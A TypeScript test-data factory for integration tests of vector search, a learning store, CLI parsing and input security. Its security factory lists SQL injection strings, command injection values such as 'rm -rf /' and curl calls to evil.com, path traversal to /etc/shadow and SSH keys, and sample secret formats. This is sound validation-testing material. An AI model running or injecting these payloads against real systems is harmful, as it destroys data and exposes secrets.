/**
 * Test Data Factories for Cross-Package Integration Tests
 */

export interface FlashAttentionTestData {
  queryVectors: number[][];
  keyVectors: number[][];
  valueVectors: number[][];
  config: {
    blockSize: number;
    attentionScale: number;
  };
}

export interface HNSWTestData {
  vectors: number[][];
  queryVectors: number[][];
  config: {
    efConstruction: number;
    M: number;
    efSearch: number;
  };
}

export interface ReasoningBankTestData {
  patterns: Array<{
    task: string;
    input: string;
    output: string;
    reward: number;
    success: boolean;
  }>;
  queries: string[];
}

export interface MaliciousInputTestData {
  sqlInjection: string[];
  commandInjection: string[];
  pathTraversal: string[];
  secrets: string[];
}

export interface ValidInputTestData {
  commands: string[];
  paths: string[];
  arguments: string[];
}

export interface CLITestData {
  commands: Array<{
    name: string;
    args: string[];
    expectedExit: number;
  }>;
}

export class PerformanceDataFactory {
  /**
   * Generate test data for Flash Attention integration tests
   */
  createFlashAttentionData(
    batchSize: number = 100,
    dimension: number = 768
  ): FlashAttentionTestData {
    return {
      queryVectors: this.generateVectors(batchSize, dimension),
      keyVectors: this.generateVectors(batchSize, dimension),
      valueVectors: this.generateVectors(batchSize, dimension),
      config: {
        blockSize: 64,
        attentionScale: Math.sqrt(dimension)
      }
    };
  }

  /**
   * Generate test data for HNSW search integration tests
   */
  createHNSWData(
    dataSize: number = 10000,
    querySize: number = 100,
    dimension: number = 768
  ): HNSWTestData {
    return {
      vectors: this.generateVectors(dataSize, dimension),
      queryVectors: this.generateVectors(querySize, dimension),
      config: {
        efConstruction: 200,
        M: 16,
        efSearch: 50
      }
    };
  }

  private generateVectors(count: number, dim: number): number[][] {
    return Array.from({ length: count }, () =>
      Array.from({ length: dim }, () => Math.random() * 2 - 1)
    );
  }

  /**
   * Generate normalized vectors (L2 norm = 1)
   */
  generateNormalizedVectors(count: number, dim: number): number[][] {
    return this.generateVectors(count, dim).map(vec => {
      const norm = Math.sqrt(vec.reduce((sum, val) => sum + val * val, 0));
      return vec.map(val => val / norm);
    });
  }
}

export class LearningDataFactory {
  /**
   * Generate test data for ReasoningBank pattern storage
   */
  createReasoningBankData(): ReasoningBankTestData {
    return {
      patterns: [
        {
          task: 'implement authentication',
          input: 'Add JWT-based authentication',
          output: 'Implemented JWT with refresh tokens',
          reward: 0.95,
          success: true
        },
        {
          task: 'optimize database query',
          input: 'Slow query on users table',
          output: 'Added index on email column',
          reward: 0.88,
          success: true
        },
        {
          task: 'fix memory leak',
          input: 'Memory grows unbounded',
          output: 'Added cleanup in event listeners',
          reward: 0.92,
          success: true
        },
        {
          task: 'implement caching',
          input: 'API responses too slow',
          output: 'Added Redis cache layer',
          reward: 0.78,
          success: false
        }
      ],
      queries: [
        'authentication patterns',
        'performance optimization',
        'memory management',
        'caching strategies'
      ]
    };
  }

  /**
   * Generate trajectory data for learning pipeline
   */
  createTrajectoryData(steps: number = 10): Array<{
    step: number;
    state: string;
    action: string;
    reward: number;
  }> {
    return Array.from({ length: steps }, (_, i) => ({
      step: i,
      state: `state-${i}`,
      action: `action-${i}`,
      reward: Math.random()
    }));
  }
}

export class SecurityDataFactory {
  /**
   * Generate malicious input test cases
   */
  createMaliciousInputs(): MaliciousInputTestData {
    return {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords--"
      ],
      commandInjection: [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl http://evil.com/steal",
        "`whoami`",
        "$(curl http://evil.com)"
      ],
      pathTraversal: [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/shadow",
        "../../../root/.ssh/id_rsa",
        "....//....//etc/passwd"
      ],
      secrets: [
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_abcdefghijklmnopqrstuvwxyz123456",
        "sk-ant-api03-1234567890abcdef",
        "postgres://user:password@localhost:5432/db",
        "-----BEGIN PRIVATE KEY-----"
      ]
    };
  }

  /**
   * Generate valid input test cases
   */
  createValidInputs(): ValidInputTestData {
    return {
      commands: [
        "agent spawn --type coder",
        "memory search --query patterns",
        "hooks route --task implement",
        "swarm init --topology hierarchical"
      ],
      paths: [
        "/home/user/project",
        "./src/components",
        "packages/performance",
        "tests/integration"
      ],
      arguments: [
        "--verbose",
        "--timeout 30",
        "--max-agents 8",
        "--format json"
      ]
    };
  }

  /**
   * Generate edge case inputs
   */
  createEdgeCaseInputs(): {
    emptyStrings: string[];
    nullBytes: string[];
    unicodeExploits: string[];
    longInputs: string[];
  } {
    return {
      emptyStrings: ["", " ", "\t", "\n"],
      nullBytes: ["\0", "test\0test", "\0\0\0"],
      unicodeExploits: [
        "𝕳𝖊𝖑𝖑𝖔",
        "Ẃ̷͙̦̳͌ö̷͓̻́r̷̢̛̝̈l̶̰̀̇d̴̰̈́",
        "​឴឴឴឴឴" // Zero-width characters
      ],
      longInputs: [
        "a".repeat(10000),
        "x".repeat(100000),
        Array(1000).fill("test").join("")
      ]
    };
  }
}

export class CLIDataFactory {
  /**
   * Generate CLI test commands
   */
  createCLICommands(): CLITestData {
    return {
      commands: [
        {
          name: "agent",
          args: ["spawn", "--type", "coder", "--name", "test-agent"],
          expectedExit: 0
        },
        {
          name: "memory",
          args: ["search", "--query", "test pattern"],
          expectedExit: 0
        },
        {
          name: "hooks",
          args: ["route", "--task", "implement feature"],
          expectedExit: 0
        },
        {
          name: "invalid",
          args: ["--unknown-flag"],
          expectedExit: 1
        }
      ]
    };
  }

  /**
   * Generate CLI argument combinations for fuzzing
   */
  createArgumentCombinations(): Array<{
    args: string[];
    shouldSucceed: boolean;
  }> {
    return [
      { args: ["--help"], shouldSucceed: true },
      { args: ["--version"], shouldSucceed: true },
      { args: ["--invalid"], shouldSucceed: false },
      { args: ["--timeout", "30"], shouldSucceed: true },
      { args: ["--timeout", "-1"], shouldSucceed: false },
      { args: ["--max-agents", "8"], shouldSucceed: true },
      { args: ["--max-agents", "0"], shouldSucceed: false }
    ];
  }
}

/**
 * Master factory for creating complete integration test scenarios
 */
export class IntegrationTestDataFactory {
  private performance = new PerformanceDataFactory();
  private learning = new LearningDataFactory();
  private security = new SecurityDataFactory();
  private cli = new CLIDataFactory();

  /**
   * Create data for Performance + Learning integration test
   */
  createPerformanceLearningScenario() {
    return {
      flashAttention: this.performance.createFlashAttentionData(),
      hnsw: this.performance.createHNSWData(),
      reasoningBank: this.learning.createReasoningBankData(),
      trajectory: this.learning.createTrajectoryData()
    };
  }

  /**
   * Create data for Security + Learning integration test
   */
  createSecurityLearningScenario() {
    return {
      maliciousInputs: this.security.createMaliciousInputs(),
      validInputs: this.security.createValidInputs(),
      edgeCases: this.security.createEdgeCaseInputs(),
      patterns: this.learning.createReasoningBankData()
    };
  }

  /**
   * Create data for CLI + Performance integration test
   */
  createCLIPerformanceScenario() {
    return {
      commands: this.cli.createCLICommands(),
      arguments: this.cli.createArgumentCombinations(),
      vectors: this.performance.generateNormalizedVectors(1000, 768)
    };
  }

  /**
   * Create data for CLI + Security integration test
   */
  createCLISecurityScenario() {
    return {
      commands: this.cli.createCLICommands(),
      maliciousInputs: this.security.createMaliciousInputs(),
      validInputs: this.security.createValidInputs()
    };
  }

  /**
   * Create data for all 4 packages integration test
   */
  createAllPackagesScenario() {
    return {
      performance: this.performance.createFlashAttentionData(),
      learning: this.learning.createReasoningBankData(),
      security: this.security.createValidInputs(),
      cli: this.cli.createCLICommands()
    };
  }
}
